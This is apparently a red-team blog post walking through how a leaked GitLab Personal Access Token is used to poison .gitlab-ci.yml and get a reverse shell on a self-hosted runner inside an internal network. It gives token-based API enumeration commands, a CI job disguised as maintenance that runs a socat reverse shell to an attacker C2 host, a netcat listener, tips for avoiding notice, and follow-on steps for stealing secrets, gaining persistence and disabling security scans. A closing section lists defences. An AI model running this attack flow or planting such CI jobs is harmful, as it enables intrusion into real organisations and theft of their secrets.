---
title: "Weaponizing Leaked PATs: A Direct Route to CI/CD Compromise"
date: 2026-03-17
description: "How a single leaked Personal Access Token can be used to pivot from public reconnaissance to internal network execution via GitLab Runners."
summary: "Leaked tokens are often dismissed as 'minor leaks.' In this write-up, we demonstrate how they serve as the ultimate foothold for pivoting into internal infrastructures."
tags: ["Red Team", "CI/CD", "GitLab", "Exploitation", "Initial Access"]
categories: ["Offensive Operations"]
series: ["Pipeline Security"]
image: "featured.jpg"
showTableOfContents: true
draft: false
---

Introduction: The Weight of a Token
===================================

Let’s be real for a second: in modern DevOps, **Personal Access Tokens (PATs)** are the invisible keys that keep the whole engine running. They authenticate scripts, CI/CD pipelines, and all those automation tools that developers love.

But from where we’re sitting, a PAT is a high-value asset that often carries way more weight than a standard password. Why? Because while people change their passwords, they rarely rotate their tokens with the same discipline.

Defining the Asset: The PAT
---------------------------

A PAT is a stand-in for traditional credentials. They’re easy to generate, but they’re almost never managed with proper scrutiny.

*   **The Usage:** Developers use them to let external tools talk to GitLab or GitHub APIs.
    
*   **The Vulnerability:** You’ll find them hardcoded in scripts, buried in build logs, or just sitting in a Slack channel because "I just needed to fix the build real quick."
    
*   **The Exploitation Potential:** Once you snag a token, you aren't just a user; you’re an identity. You can touch private codebases and, more importantly, interact with the **CI/CD infrastructure**.
    

The Real Target: GitLab Runners
-------------------------------

If you want to turn a token into a shell, you need to understand **GitLab Runners**. These are the agents that actually execute the commands defined in the .gitlab-ci.yml file.

The "holy grail" here is the **Self-Hosted Runner**. Unlike cloud runners, these are installed directly inside the organization's network (On-Prem, AWS, GCP, etc.). Since they sit behind the firewall but have access to internal databases and private subnets, they are the perfect pivot point for a Red Team op.

Reconnaissance: Tracking the Leak
=================================

Snagging a PAT is the first step in the kill chain. On an engagement, we’re usually hunting in these "leaky" spots:

1.  **Source Code:** Look for hardcoded tokens in config files.
    
2.  **Git Logs:** Use git log to find historical commits where a token was added and then "deleted." (Git never forgets).
    
3.  **Environment Files:** Accidental uploads of .env or .gitconfig.
    
4.  **Collaboration Tools:** Slack, Teams, or Jira tickets where a dev was "just helping out" a teammate.
    

The Attack Flow: Poisoning the Pipeline
=======================================

Poisoning a pipeline follows a very specific, logical flow:

1.  **Initial Access:** Grab that PAT via recon.
    
2.  **Code Injection:** Use the PAT to push a "malicious" update to the .gitlab-ci.yml.
    
3.  **Automated Trigger:** GitLab sees the push and tells an internal Runner to do its job.
    
4.  **Local Execution:** The Runner executes your instructions _inside_ the network.
    
5.  **C2 Callback:** Your payload initiates a reverse shell, punching a hole through the firewall from the inside out.
    

Case Study: From Token to Shell
===============================

Let's walk through a real scenario: moving from a leaked PAT to a stable reverse shell inside a private LAN.

### Step 1: API Enumeration

Once I have the token, my first move is to see what I actually own. I’m hunting for private repositories where CI/CD is active.

```Bash
curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
'http://10.8.20.80/api/v4/projects?owned=true' | jq '.[] | {name: .name, id: .id, visibility: .visibility}'
```

_Pro tip: Focus on projects marked as_ _**PRIVATE**__. That’s where the sensitive data lives._

### Step 2: Verifying Permissions

I need to know if I can actually push code. I’ll check my privilege level on the project (e.g., Project ID: 1).

```Bash
curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
'http://10.8.20.80/api/v4/projects/1' | jq '.permissions'
```

*   **Level 30 (Developer):** This is all we need. We can commit code and trigger builds.
    
*   **Level 40/50 (Maintainer/Owner):** Full God mode over the project and runner settings.
    

### Step 3: Pipeline Poisoning

Now for the fun part. I’ll clone the repo and modify the .gitlab-ci.yml file. To stay stealthy, I’ll name my job something boring like "Security Scan" or "Cleanup Task."

```YAML
variables:
  # My C2 (Attacker) machine
  C2_HOST: "192.168.100.2"
  C2_PORT: "4445"


stages:
  - build
  - maintenance


infra_cleanup:
  stage: maintenance
  allow_failure: true
  script:
    - echo "Executing routine maintenance..."
    # Using socat for a stable, interactive TTY shell
    - socat TCP:$C2_HOST:$C2_PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

_Note: I use allow\_failure: true so that even if my shell dies, the pipeline doesn't show a big red "FAILED" sign that alerts the devs._

### Step 4: The Trigger

First, I set up my listener on my machine:

```Bash
rlwrap nc -nlvp 4445
```

Then, I push the "poisoned" config:

```bash
git add .  
git commit -m "chore: update ci-cd maintenance script v1.1"  
git push
````

The second that push hits, GitLab tells the internal runner to work. The runner executes my socat command, and suddenly, I have a shell sitting right inside their internal LAN.

The Aftermath: Impact of Compromise
===================================

Once you’re on that runner, the party is just starting:

*   **Exfiltrate Secrets:** You can read all the environment variables and files stored on the host.
    
*   **Persistence:** Add your SSH key to authorized\_keys or drop a persistent C2 agent.
    
*   **Bypass Controls:** You can literally disable security scans (SAST/DAST) for other projects to let your own exploits slide into production.
    

How to Stop People Like Us
==========================

If you don't want to get popped this way, you need a multi-layered defense:

1.  **Secret Detection:** Use tools like **Gitleaks** or **TruffleHog**. Block the commit if a secret is detected before it even hits the server.
    
2.  **Token Scoping:** Don't give every token api access. Use the Principle of Least Privilege. If it only needs to read a repo, only give it read\_repository.
    
3.  **Ephemeral Runners:** Use Docker-based runners that spin up a fresh container for every job and then delete it. This kills my persistence.
    
4.  **Branch Protection:** Never allow direct pushes to the main branch or changes to the .gitlab-ci.yml without a peer-reviewed Merge Request (MR).
    

Stay sharp. The best defense is knowing exactly how the attack looks from the other side.